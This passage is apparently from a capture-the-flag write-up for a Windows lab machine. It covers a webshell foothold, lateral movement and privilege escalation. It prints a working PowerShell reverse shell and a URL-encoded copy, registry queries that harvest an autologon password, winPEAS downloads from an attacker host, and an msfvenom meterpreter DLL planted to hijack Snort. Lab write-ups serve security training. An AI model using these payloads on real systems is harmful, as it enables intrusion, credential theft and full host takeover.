listening on [any] 1337 ...
```

```bash
# our reverse PowerShell code
$ cat revps
powershell -ep bypass -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.16',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();"
```

Next, we can **URL-encode** our shell via [CyberChef](https://gchq.github.io/CyberChef):

![](cyberchef.png)

```bash 
# URL-encoded payload
powershell%20%2Dep%20bypass%20%2Dnop%20%2Dc%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%2710%2E10%2E14%2E16%27%2C1337%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C%200%2C%20%24bytes%2ELength%29%29%20%2Dne%200%29%7B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%3B%7D%24client%2EClose%28%29%3B%22
```

We are now ready to pass it as a command to our webshell and catch our reverse shell back:

```bash
# opening a listener to catch the shell
$ sudo nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.250] 53288
whoami
analysis\svc_web
PS C:\inetpub\internal\dashboard\uploads>
```

## Lateral movement

Upon exploring the target, there are some things to note down:

```bash
PS C:\inetpub\internal\dashboard\uploads> dir c:\


    R?pertoire?: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/06/2023     10:01                inetpub
d-----       05/11/2022     20:14                PerfLogs
d-----       08/05/2023     10:20                PHP
d-----       23/01/2024     22:13                private
d-r---       18/11/2023     09:56                Program Files
d-----       08/05/2023     10:11                Program Files (x86)
d-----       09/07/2023     10:57                Snort
d-r---       26/05/2023     14:20                Users
d-----       24/01/2024     01:15                Windows
-a----       24/01/2024     08:08         363136 snortlog.txt

PS C:\inetpub\internal\dashboard\uploads> dir c:\users


    R?pertoire?: C:\users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/01/2024     10:33                Administrateur
d-----       05/01/2024     21:29                jdoe
d-r---       07/05/2023     21:44                Public
d-----       26/05/2023     11:02                soc_analyst
d-----       26/05/2023     14:20                webservice
d-----       23/05/2023     10:10                wsmith
```

1. [**Snort**](https://www.crowdstrike.com/cybersecurity-101/threat-intelligence/snort-rules/) is used on the target:

	_**Snort** is an open-source network **intrusion detection and prevention system (IDS/IPS)** that monitors network traffic and identifies potentially malicious activities on Internet Protocol (IP) networks._

2. There are multiple users: `Administrateur`, `jdoe`, `soc_analyst`, `wsmith`, and `webservice`, and we have access to none of them.

We can start seaching for locations that might contain interesting info, for example, looking for the "*password*" keyword in the Windows registry. Skimming across the output, we see this:

> [THM Red Teaming path: Active Directory - Credentials Harvesting](https://tryhackme.com/paths).

```bash
*Evil-WinRM* PS C:\Users\jdoe\Documents> reg query HKLM /f password /t REG_SZ /s

<SNIP>

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj

<SNIP>
```

Upon closer inspection of this file:

```bash
PS C:\inetpub\internal\dashboard\uploads> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
<SNIP>
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe
<SNIP>
```

It seems that we have found some credentials: `jdoe:7y4Z4^*y9Zzj`! We can try logging in via WinRM:

```bash
$ evil-winrm -i 10.10.11.250 -u jdoe -p 7y4Z4^*y9Zzj

<SNIP>

*Evil-WinRM* PS C:\Users\jdoe\Documents> ls ..\Desktop

    Directory: C:\Users\jdoe\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/23/2024  10:11 PM             34 user.txt

*Evil-WinRM* PS C:\Users\jdoe\Documents> type ..\Desktop\user.txt
<SNIP>
```

## Privilege escalation

We can start searching for potential privesc routers using [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20240121-3ce7876d). We can launch a Python HTTP server, download the file from the target and execute it:

```bash
# start an HTTP server
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
# download winpeas executable
*Evil-WinRM* PS C:\Users\jdoe> wget http://10.10.14.16:8888/winPEASx64.exe -o recon.exe
# run winpeas
*Evil-WinRM* PS C:\Users\jdoe>.\recon.exe

<SNIP>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  analysis.htb.
    DefaultUserName               :  jdoe
    DefaultPassword               :  7y4Z4^*y9Zzj

<SNIP>

   =================================================================================================

    Snort(Snort)[C:\Snort\bin\snort.exe /SERVICE] - Autoload - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
   =================================================================================================

<SNIP>

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (ANALYSIS\Administrateur) run_bctextencoder: C:\Users\jdoe\AppData\Local\Automation\run.bat
    Permissions file: jdoe [AllAccess]
    Permissions folder(DLL Hijacking): jdoe [AllAccess]
    Trigger: At log on of ANALYSIS\jdoe

   =================================================================================================

<SNIP>
```

`winPEAS` was able to find the credentials we already have, and two possible DLL Hijacking vulnerabilities, one related to Snort. After searching for "*DLL hijacking snort*", this page pops up: [Snort 2.9.7.0-WIN32 DLL Hijacking](https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html) which is associated with [CVE-2016-1417](https://nvd.nist.gov/vuln/detail/CVE-2016-1417). Among others, this article mentions:

    _`snort.exe` can be exploited to execute arbitrary code on victims system via DLL hijacking, the vulnerable DLL is `tcapi.dll`. If a user opens a `.pcap` file from a remote share using `snort.exe` and the DLL exists in that directory._

    Then goes up and lists some steps:
    1. create any empty file on a remote dir share with a `.pcap` extension
    2. place arbitrary DLL named  `tcapi.dll` in remote share
    3. open with `snort.exe`
    4. BAM!

In our case `snort` is already up and running:

```bash
# getting information about the snort process
*Evil-WinRM* PS C:\Users\jdoe> Get-Process snort

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    154      16    38560      18784              4912   0 snort

# getting snort's version
*Evil-WinRM* PS C:\Users\jdoe\Documents> C:\Snort\bin\snort.exe -V
snort.exe :
    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
   ,,_     -*> Snort! <*-  o"  )~   Version 2.9.20-WIN64 GRE (Build 82)    ''''    By Martin Roesch & The Snort Team: http://www.snort.org/contact#team           Copyright (C) 2014-2022 Cisco and/or its affiliates. All rights reserved.           Copyright (C) 1998-2013 Sourcefire, Inc., et al.           Using PCRE version: 8.10 2010-06-25           Using ZLIB version: 1.2.11
```

> [DLL Hijacking Practical](https://www.cs.toronto.edu/~arnold/427/16s/csc427_16s/tutorials/DLLHijacking/DLL%20Hijacking%20Practical.pdf)

Snort's version is: `2.9.20-WIN64`, but the vulneratiblity we found is for `2.9.7.0-WIN32`. Since we don't have much else to try and `winPEAS` highlighted it, let's give a try anyway! 

Looking at Snort's configuration file, it seems like it uses `sf_engine.dll` (instead of `tcapi.dll`) and picking it up from `C:\Snort\lib\snort_dynamicpreprocessor`:

```bash
# reading snort's configuration file
*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> type ../../etc/snort.conf

<SNIP>

###################################################
# This file contains a sample snort configuration.
# You should take the following steps to create your own custom configuration:
#
#  1) Set the network variables.
#  2) Configure the decoder
#  3) Configure the base detection engine
#  4) Configure dynamic loaded libraries
#  5) Configure preprocessors
#  6) Configure output plugins
#  7) Customize your rule set
#  8) Customize preprocessor and decoder rule set
#  9) Customize shared object rule set
###################################################

<SNIP>

###################################################
# Step #4: Configure dynamic loaded libraries.
# For more information, see Snort Manual, Configuring Snort - Dynamic Modules
###################################################

# path to dynamic preprocessor libraries
dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor

# path to base preprocessor engine
dynamicengine C:\Snort\lib\snort_dynamicengine\sf_engine.dll

# path to dynamic rules libraries
# dynamicdetection directory C:\Snort\lib\snort_dynamicrules
```

We can find out if the `snort` process is running with elevated privileges:

```bash
*Evil-WinRM* PS C:\Users\jdoe> Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated | findstr snort
snort                                     True
```

Next, we can try creating a malicious DLL with the same name, i.e., `sf_engine.dll`, containing reverse shell code, so the `snort` process can pick it up and execute it with elevated privileges:

```bash
# creating a malicious DLL
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll LHOST=10.10.14.16 LPORT=9999 > sf_engine.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes

# starting a Python HTTP server
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
# download the malicious DLL
*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> wget http://10.10.14.16:8000/sf_engine.dll -o sf_engine.dll

# confirm the file was downloaded
*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> ls

    Directory: C:\snort\lib\snort_dynamicpreprocessor

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
<SNIP>
-a----        1/23/2024  10:13 PM           9216 sf_engine.dll
<SNIP>
```

Finally, we can launch our meterpreter and wait to catch our shell:

```bash
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     9999             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.16:9999
[*] Sending stage (200774 bytes) to 10.10.11.250
[*] Meterpreter session 7 opened (10.10.14.16:9999 -> 10.10.11.250:63692) at 2024-01-24 12:44:05 +0000

meterpreter > getuid
Server username: ANALYSIS\Administrateur
meterpreter > shell
Process 3120 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type c:\users\administrateur\desktop\root.txt
type c:\users\administrateur\desktop\root.txt
<SNIP>
``` -->

![](machine_pwned.png){: width="75%" .normal}